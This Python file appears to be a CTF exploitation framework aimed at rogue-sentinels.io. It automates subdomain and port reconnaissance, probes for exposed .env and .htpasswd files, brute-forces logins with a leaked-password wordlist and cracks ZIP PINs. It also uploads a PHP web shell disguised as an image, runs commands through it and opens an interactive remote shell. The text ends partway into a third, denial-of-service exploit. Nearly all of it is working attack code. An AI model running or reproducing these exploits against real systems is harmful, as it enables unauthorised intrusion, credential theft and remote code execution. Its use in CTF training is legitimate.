#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           ROGUE SENTINELS - CTF EXPLOITATION FRAMEWORK v2                    â•‘
â•‘                   Full Pentest Methodology - Group F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Complete exploitation script following pentest methodology:
1. DNS Reconnaissance (subdomains)
2. Port scanning (Nmap)
3. Enumeration (Gobuster/Dirbuster)
4. Vulnerability-specific exploitation
"""

import os
import sys
import time
import requests
import subprocess
import socket
import zipfile
import base64
import re
import io
import json
import tempfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, quote

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# COULEURS ET UTILITAIRES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{Colors.CYAN}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•      â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘  â•‘
â•‘  â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•    â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•  â•‘
â•‘                                                                              â•‘
â•‘            CTF FULL PENTEST FRAMEWORK - Group F                        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Colors.ENDC}""")

def print_success(msg): print(f"{Colors.GREEN}[+] {msg}{Colors.ENDC}")
def print_error(msg): print(f"{Colors.RED}[-] {msg}{Colors.ENDC}")
def print_info(msg): print(f"{Colors.BLUE}[*] {msg}{Colors.ENDC}")
def print_warning(msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.ENDC}")
def print_flag(flag):
    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}")
    print(f"  ğŸš© FLAG CAPTURÃ‰: {flag}")
    print(f"{'='*60}{Colors.ENDC}\n")

def print_section(title):
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}{Colors.ENDC}\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    input(f"\n{Colors.CYAN}Appuyez sur EntrÃ©e pour continuer...{Colors.ENDC}")

def run_command(cmd, timeout=60):
    """ExÃ©cuter une commande shell et retourner le rÃ©sultat"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# FONCTIONS DE CHARGEMENT DES WORDLISTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def load_wordlist(filename):
    """Load wordlist from wordlists directory/"""
    try:
        # Get absolute path of script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        # Go up one level to reach project root
        project_root = os.path.dirname(script_dir)
        wordlist_path = os.path.join(project_root, 'wordlists', filename)

        with open(wordlist_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
        print_success(f"Wordlist loaded: {filename} ({len(lines)} entries)")
        return lines
    except FileNotFoundError:
        print_error(f"Wordlist not found: {filename}")
        return []
    except Exception as e:
        print_error(f"Error loading {filename}: {e}")
        return []

# Load wordlists from repository files
COMMON_SUBDOMAINS = load_wordlist('common_subdomains.txt')
COMMON_PASSWORDS = load_wordlist('leaked_passwords.txt')
COMMON_URLS = load_wordlist('common_urls.txt')
COMMON_USERS = load_wordlist('leaked_users.txt')

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# PHASE 0: RECONNAISSANCE INITIALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Reconnaissance:
    """Reconnaissance phase: DNS, ports, services"""
    
    def __init__(self, base_domain="rogue-sentinels.io"):
        self.base_domain = base_domain
        self.discovered_subdomains = []
        self.discovered_services = {}
        
    def run_full_recon(self):
        """Execute complete reconnaissance"""
        clear_screen()
        print_section("PHASE 0: RECONNAISSANCE INITIALE")
        
        print_info(f"Target: {self.base_domain}")
        
        # Ã‰tape 1: EnumÃ©ration DNS
        print_info("\n[1/3] Subdomain enumeration...")
        self.enumerate_subdomains()
        
        # Ã‰tape 2: Scan de ports
        print_info("\n[2/3] Port scanning...")
        self.scan_ports()
        
        # Ã‰tape 3: Service identification
        print_info("\n[3/3] Service identification...")
        self.identify_services()
        
        # RÃ©sumÃ©
        self.print_summary()
        
        return self.discovered_services
    
    def enumerate_subdomains(self):
        """Endd active subdomains"""
        print_info(f"Testing {len(COMMON_SUBDOMAINS)} subdomains...")
        
        found = []
        
        for subdomain in COMMON_SUBDOMAINS:
            fqdn = f"{subdomain}.{self.base_domain}"
            
            # Test DNS
            try:
                ip = socket.gethostbyname(fqdn)
                print_success(f"{fqdn} -> {ip}")
                found.append({'subdomain': subdomain, 'fqdn': fqdn, 'ip': ip})
            except socket.gaierror:
                pass
        
        # Test aussi le domaine principal
        try:
            ip = socket.gethostbyname(self.base_domain)
            print_success(f"{self.base_domain} -> {ip}")
            found.append({'subdomain': '', 'fqdn': self.base_domain, 'ip': ip})
        except:
            pass
        
        self.discovered_subdomains = found
        print_info(f"\nTotal: {len(found)} subdomains found")
        
        return found
    
    def scan_ports(self):
        """Scanner les ports sur chaque sous-domaine"""
        
        # Common ports to scan
        common_ports = [21, 22, 80, 443, 3000, 5000, 8000, 8080, 8443, 9000, 
                       19480, 64375]  # CTF-specific ports
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            ip = entry['ip']
            
            print_info(f"\nScan de {fqdn} ({ip})...")
            
            open_ports = []
            
            # Essayer nmap si disponible
            nmap_result = run_command(f"nmap -p- --min-rate=1000 -T4 {ip} 2>/dev/null | grep ^[0-9]", timeout=120)
            
            if "open" in nmap_result:
                # Parse nmap results
                for line in nmap_result.split('\n'):
                    if 'open' in line:
                        port = line.split('/')[0]
                        try:
                            open_ports.append(int(port))
                            print_success(f"  Port {port}: ouvert")
                        except:
                            pass
            else:
                # Fallback: scan manuel des ports courants
                for port in common_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        sock.close()
                        
                        if result == 0:
                            open_ports.append(port)
                            print_success(f"  Port {port}: ouvert")
                    except:
                        pass
            
            entry['ports'] = open_ports
    
    def identify_services(self):
        """Identifier les services sur chaque port"""
        
        for entry in self.discovered_subdomains:
            fqdn = entry['fqdn']
            subdomain = entry['subdomain']
            
            for port in entry.get('ports', []):
                service_key = f"{subdomain}:{port}" if subdomain else f"main:{port}"
                
                # Tester HTTP/HTTPS
                for protocol in ['http', 'https']:
                    url = f"{protocol}://{fqdn}:{port}"
                    try:
                        r = requests.get(url, timeout=5, verify=False)
                        
                        # Identifier le service
                        service_info = {
                            'url': url,
                            'fqdn': fqdn,
                            'port': port,
                            'protocol': protocol,
                            'status': r.status_code,
                            'title': '',
                            'server': r.headers.get('Server', ''),
                            'technology': []
                        }
                        
                        # Extraire le titre
                        title_match = re.search(r'<title>([^<]+)</title>', r.text, re.I)
                        if title_match:
                            service_info['title'] = title_match.group(1)
                        
                        # Identifier les technologies
                        if 'geoserver' in r.text.lower():
                            service_info['technology'].append('GeoServer')
                        if 'upload' in r.text.lower():
                            service_info['technology'].append('FileUpload')
                        if 'login' in r.text.lower() or 'auth' in r.text.lower():
                            service_info['technology'].append('Authentication')
                        if 'calculator' in r.text.lower() or 'adder' in r.text.lower():
                            service_info['technology'].append('Calculator')
                        
                        self.discovered_services[service_key] = service_info
                        print_success(f"  {url} - {service_info['title'] or 'No title'}")
                        break  # Si HTTP marche, pas besoin de tester HTTPS
                        
                    except:
                        pass
    
    def print_summary(self):
        """Display reconnaissance summary"""
        print_section("RÃ‰SUMÃ‰ DE LA RECONNAISSANCE")
        
        print(f"{Colors.BOLD}Discovered subdomains:{Colors.ENDC}")
        for entry in self.discovered_subdomains:
            ports_str = ', '.join(map(str, entry.get('ports', [])))
            print(f"  â€¢ {entry['fqdn']} ({entry['ip']}) - Ports: {ports_str or 'aucun'}")
        
        print(f"\n{Colors.BOLD}Identified services:{Colors.ENDC}")
        for key, service in self.discovered_services.items():
            tech_str = ', '.join(service['technology']) if service['technology'] else 'Unknown'
            print(f"  â€¢ {service['url']}")
            print(f"    Title: {service['title'] or 'N/A'}")
            print(f"    Tech: {tech_str}")
            print()


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #1: FileServer - Bruteforce + ZIP Cracking
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit1_FileServer:
    """
    Exploitation du FileServer:
    1. Sensitive files enumeration (.htaccess)
    2. Authentication bruteforce
    3. Filesystem exploration
    4. TÃ©lÃ©chargement et bruteforce des ZIP
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.email = None
        self.password = None
        self.token = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #1: FileServer - Bruteforce + ZIP Cracking")
        
        # Configuration
        print_info("Service configuration:")
        host = input(f"{Colors.CYAN}Host (default: fileserver.rogue-sentinels.io): {Colors.ENDC}") or "fileserver.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 8080): {Colors.ENDC}") or "8080"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Mode d'exploitation
        print_info("\nOptions:")
        print("  [1] Complete exploitation (enum â†’ bruteforce â†’ extraction)")
        print("  [2] Direct JWT token injection")
        mode = input(f"{Colors.CYAN}Choice (1/2): {Colors.ENDC}") or "1"
        
        if mode == "2":
            self.token = input(f"{Colors.YELLOW}JWT Token: {Colors.ENDC}").strip()
            self.session.headers['Authorization'] = f"Bearer {self.token}"
            # Also in cookie for compatibility
            self.session.cookies.set('token', self.token)
        else:
            # Ã‰tape 1: EnumÃ©ration
            print_info("\n[Ã‰tape 1] Sensitive files enumeration...")
            self.enumerate_files()
            
            # Ã‰tape 2: Bruteforce password
            print_info("\n[Ã‰tape 2] Authentication bruteforce...")
            if not self.bruteforce_auth():
                print_error("Bruteforce failed")
                manual_pass = input(f"{Colors.YELLOW}Manual password: {Colors.ENDC}")
                if manual_pass:
                    self.password = manual_pass
                    self.authenticate()
        
        # Ã‰tape 3: Filesystem exploration
        print_info("\n[Ã‰tape 3] Filesystem exploration...")
        zip_files = self.explore_filesystem()
        
        # Ã‰tape 4: TÃ©lÃ©chargement et crack des ZIP
        print_info("\n[Ã‰tape 4] TÃ©lÃ©chargement et crack des ZIP...")
        flag = self.crack_zips(zip_files)
        
        if flag:
            print_flag(flag)
        else:
            print_error("Flag not found")
        
        pause()
        return flag
    
    def enumerate_files(self):
        """Search for exposed sensitive files"""
        
        sensitive_files = ['.htaccess', '.htpasswd', 'robots.txt', '.git/config', 
                         '.env', 'config.php', 'config.json']
        
        for file in sensitive_files:
            try:
                r = self.session.get(f"{self.base_url}/{file}", timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    print_success(f"File found: {file}")
                    print_info(f"Content:\n{r.text[:500]}")
                    
                    # Search for emails
                    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', r.text)
                    if emails:
                        self.email = emails[0]
                        print_success(f"Email found: {self.email}")
            except:
                pass
        
        if not self.email:
            self.email = input(f"{Colors.YELLOW}Email (default: security-admin@web2000-corp.com): {Colors.ENDC}") or "security-admin@web2000-corp.com"
    
    def bruteforce_auth(self):
        """Password bruteforce"""
        
        # Toolkit passwords
        passwords = COMMON_PASSWORDS
        
        print_info(f"Target email: {self.email}")
        print_info(f"Testing {len(passwords)} passwords...")
        
        for pwd in passwords:
            try:
                data = {"email": self.email, "password": pwd}
                r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
                
                if r.status_code == 200:
                    try:
                        resp = r.json()
                        if 'token' in resp:
                            self.password = pwd
                            self.token = resp['token']
                            self.session.headers['Authorization'] = f"Bearer {self.token}"
                            self.session.cookies.set('token', self.token)
                            print_success(f"Password found: {pwd}")
                            print_success(f"Token: {self.token[:50]}...")
                            return True
                    except:
                        pass
            except:
                pass
        
        return False
    
    def authenticate(self):
        """S'authentifier avec les credentials"""
        try:
            data = {"email": self.email, "password": self.password}
            r = self.session.post(f"{self.base_url}/api/v1/auth", json=data, timeout=5)
            
            if r.status_code == 200:
                resp = r.json()
                if 'token' in resp:
                    self.token = resp['token']
                    self.session.headers['Authorization'] = f"Bearer {self.token}"
                    self.session.cookies.set('token', self.token)
                    print_success(f"Authentication successful!")
                    return True
        except Exception as e:
            print_error(f"Error: {e}")
        
        return False
    
    def explore_filesystem(self):
        """Explore filesystem to find backups"""

        zip_files = []

        # Endpoints de base Ã  tester
        base_endpoint = [
            '/api/v1/folder?folder=',
        ]

        # Utiliser la wordlist des URLs pour les paths to test
        print_info(f"Using wordlist: {len(COMMON_URLS)} paths to test")
        endpoints = base_endpoint.copy()

        # Ajouter tous les chemins de la wordlist
        for path in COMMON_URLS:
            endpoints.append(f'/api/v1/folder?folder={path}')

        print_info(f"Total: {len(endpoints)} endpoints to test")

        for endpoint in endpoints:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}", timeout=5)

                if r.status_code == 200:
                    print_success(f"Endpoint accessible: {endpoint}")
                    print_info(f"Response: {r.text[:200]}")

                    # Search for ZIP files
                    zip_matches = re.findall(r'[\w\-\_\.]+\.zip', r.text)
                    for z in zip_matches:
                        if z not in zip_files:
                            zip_files.append(z)
                            print_info(f"  ZIP: {z}")

                    # Parser JSON
                    try:
                        data = r.json()
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, str) and item.endswith('.zip'):
                                    if item not in zip_files:
                                        zip_files.append(item)
                    except:
                        pass

                    # If ZIPs found, stop search
                    if zip_files:
                        print_success(f"Found {len(zip_files)} ZIP file(s), stopping search")
                        break
            except:
                pass
        
        # If no ZIP found, manual generation
        if not zip_files:
            print_warning("No ZIP found. Generating list...")
            print_info("Curl command to explore:")
            print(f"{Colors.CYAN}curl -b 'token={self.token}' '{self.base_url}/api/v1/folder?folder=backups'{Colors.ENDC}")
            
            pattern = input(f"{Colors.YELLOW}ZIP pattern (default: backup_2001_): {Colors.ENDC}") or "backup_2001_"
            start = int(input(f"{Colors.YELLOW}Start (default: 124): {Colors.ENDC}") or "124")
            end = int(input(f"{Colors.YELLOW}End (default: 350): {Colors.ENDC}") or "350")
            
            for i in range(start, end + 1):
                zip_files.append(f"{pattern}{i}.zip")
        
        print_info(f"\nTotal: {len(zip_files)} fichiers ZIP Ã  traiter")
        return zip_files
    
    def download_zip(self, filename):
        """Download a ZIP file"""
        
        urls = [
            f"{self.base_url}/api/v1/download?file={filename}",
            f"{self.base_url}/api/v1/file?file={filename}",
            f"{self.base_url}/api/v1/files/{filename}",
        ]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    # Check magic bytes
                    if r.content[:2] == b'PK':
                        return r.content
            except:
                pass
        
        return None
    
    def crack_zip(self, zip_content, filename):
        """Bruteforce le PIN 4 chiffres"""
        
        try:
            zip_buffer = io.BytesIO(zip_content)
            
            # Test PINs from 1000 to 9999
            for pin in range(1000, 10000):
                pin_str = str(pin)
                
                try:
                    with zipfile.ZipFile(zip_buffer, 'r') as zf:
                        zf.setpassword(pin_str.encode())
                        
                        for name in zf.namelist():
                            try:
                                content = zf.read(name)
                                content_str = content.decode('utf-8', errors='ignore')
                                
                                # Flag found?
                                if 'FLAG' in content_str or 'flag' in content_str.lower():
                                    print_success(f"PIN found: {pin_str}")
                                    return pin_str, content_str
                                
                                # If we can read, it's the right PIN
                                print_success(f"PIN found: {pin_str}")
                                return pin_str, content_str
                            except RuntimeError:
                                # Mauvais mot de passe
                                break
                            except:
                                break
                except:
                    pass
                
                zip_buffer.seek(0)
                
                if pin % 1000 == 0:
                    print(f"  Testing PIN: {pin}...", end='\r')
                    
        except Exception as e:
            print_error(f"Error: {e}")
        
        return None, None
    
    def crack_zips(self, zip_files):
        """Download and crack all ZIPs"""
        
        for filename in zip_files:
            print_info(f"Processing: {filename}")
            
            # TÃ©lÃ©charger
            content = self.download_zip(filename)
            if not content:
                continue
            
            print_success(f"  Downloaded: {len(content)} bytes")
            
            # Cracker
            pin, file_content = self.crack_zip(content, filename)
            
            if pin and file_content:
                # Chercher le flag
                flag_match = re.search(r'FLAG[_\-\w]+', file_content, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                # Afficher le contenu
                print_info(f"Content:\n{file_content[:500]}")
                
                user_flag = input(f"{Colors.YELLOW}Flag found? (copy or Enter): {Colors.ENDC}")
                if user_flag:
                    return user_flag
        
        return None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #2: Travel - File Upload RCE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit2_Travel:
    """
    Exploitation de Travel via File Upload:
    1. Upload disguised PHP shell (.png.php)
    2. Shell access
    3. Flag search
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        self.shell_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #2: Travel - File Upload RCE")
        
        # Configuration
        host = input(f"{Colors.CYAN}Host (default: travel.rogue-sentinels.io): {Colors.ENDC}") or "travel.rogue-sentinels.io"
        port = input(f"{Colors.CYAN}Port (default: 80): {Colors.ENDC}") or "80"
        self.base_url = f"http://{host}:{port}"
        
        print_info(f"Target: {self.base_url}")
        
        # Ã‰tape 1: Reconnaissance
        print_info("\n[Ã‰tape 1] Reconnaissance...")
        self.recon()
        
        # Ã‰tape 2: Upload du shell
        print_info("\n[Ã‰tape 2] PHP shell upload...")
        if not self.upload_shell():
            print_warning("Automatic upload failed")
            print_info("Manual upload:")
            print(f"{Colors.CYAN}curl -X POST {self.base_url}/photos.php -F file=@shell.png.php{Colors.ENDC}")
            input(f"{Colors.YELLOW}Press Enter after l'upload manuel...{Colors.ENDC}")
        
        # Ã‰tape 3: Trouver le shell
        print_info("\n[Ã‰tape 3] Shell location...")
        if not self.find_shell():
            self.shell_url = input(f"{Colors.YELLOW}Shell URL: {Colors.ENDC}")
        
        # Ã‰tape 4: Exploitation
        print_info("\n[Ã‰tape 4] Flag search...")
        flag = self.find_flag()
        
        if flag:
            print_flag(flag)
        
        # Shell interactif
        self.interactive_shell()
        
        pause()
        return flag
    
    def recon(self):
        """Reconnaissance de l'application"""
        try:
            r = self.session.get(self.base_url, timeout=10)
            print_success(f"Application accessible (Status: {r.status_code})")
            
            # Identifier l'application
            if 'salmon' in r.text.lower():
                print_info("Application: The Happy Salmon")
            if 'upload' in r.text.lower() or 'photo' in r.text.lower():
                print_success("Upload functionality detected")
            
            # Chercher les endpoints
            forms = re.findall(r'action=["\']([^"\']+)["\']', r.text)
            for form in forms:
                print_info(f"Form: {form}")
                
        except Exception as e:
            print_error(f"Error: {e}")
    
    def upload_shell(self):
        """PHP shell upload"""
        
        # Simple PHP shell
        shell_content = b'<?php system($_REQUEST["cmd"]); ?>'
        
        # Upload endpoint (from toolkit)
        upload_url = f"{self.base_url}/photos.php"
        
        # Different techniques
        attempts = [
            ('shell.png.php', 'image/png'),
            ('shell.php.png', 'image/png'),
            ('shell.phtml', 'image/png'),
            ('shell.php', 'application/x-php'),
        ]
        
        for filename, mimetype in attempts:
            try:
                files = {'file': (filename, shell_content, mimetype)}
                r = self.session.post(upload_url, files=files, timeout=10)
                
                if r.status_code == 200:
                    if 'error' not in r.text.lower() and 'invalid' not in r.text.lower():
                        print_success(f"Shell uploaded: {filename}")
                        self.shell_filename = filename
                        return True
                    else:
                        print_warning(f"{filename}: Rejected")
            except Exception as e:
                print_error(f"Error upload: {e}")
        
        return False
    
    def find_shell(self):
        """Endd uploaded shell"""
        
        # Common directories
        dirs = ['/salmon-uploads/', '/uploads/', '/images/', '/photos/', 
                '/pictures/', '/img/', '/files/']
        
        filename = getattr(self, 'shell_filename', 'shell.png.php')
        
        for d in dirs:
            url = f"{self.base_url}{d}{filename}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    # Tester si le shell fonctionne
                    test_url = f"{url}?cmd=id"
                    test_r = self.session.get(test_url, timeout=5)
                    if 'uid=' in test_r.text or 'www-data' in test_r.text:
                        print_success(f"Shell found: {url}")
                        self.shell_url = url
                        return True
            except:
                pass
        
        return False
    
    def exec_cmd(self, cmd):
        """Execute command via shell"""
        try:
            r = self.session.get(f"{self.shell_url}?cmd={quote(cmd)}", timeout=10)
            return r.text
        except:
            return None
    
    def find_flag(self):
        """Rechercher le flag"""
        
        commands = [
            "grep -r 'FLAG' /var/www/ 2>/dev/null | head -10",
            "cat /var/www/html/reservations.php 2>/dev/null | grep -i flag",
            "find /var/www -name '*.php' -exec grep -l FLAG {} \\; 2>/dev/null",
            "cat /var/www/html/*.php 2>/dev/null",
        ]
        
        for cmd in commands:
            print_info(f"Execution: {cmd}")
            result = self.exec_cmd(cmd)
            
            if result:
                # Search for flag
                flag_match = re.search(r'FLAG[_\-\w]+', result, re.I)
                if flag_match:
                    return flag_match.group(0)
                
                if 'flag' in result.lower():
                    print(result[:500])
        
        return None
    
    def interactive_shell(self):
        """Shell interactif"""
        print_info("\n=== Shell Interactif (tapez 'exit' pour quitter) ===")
        
        while True:
            cmd = input(f"{Colors.GREEN}shell> {Colors.ENDC}")
            if cmd.lower() == 'exit':
                break
            if cmd:
                result = self.exec_cmd(cmd)
                if result:
                    print(result)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# VULNÃ‰RABILITÃ‰ #3: Restricted - DoS + Info Disclosure
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class Exploit3_Restricted:
    """
    Exploitation de Restricted via Fuzzing:
    1. Exhaustive fuzzing (x,y,z) jusqu'au crash
    2. Error page retrieval
    3. Base64 flag decoding
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = None
        
    def run(self):
        clear_screen()
        print_section("EXPLOIT #3: Restricted - DoS + Information Disclosure")
        
        # Configuration
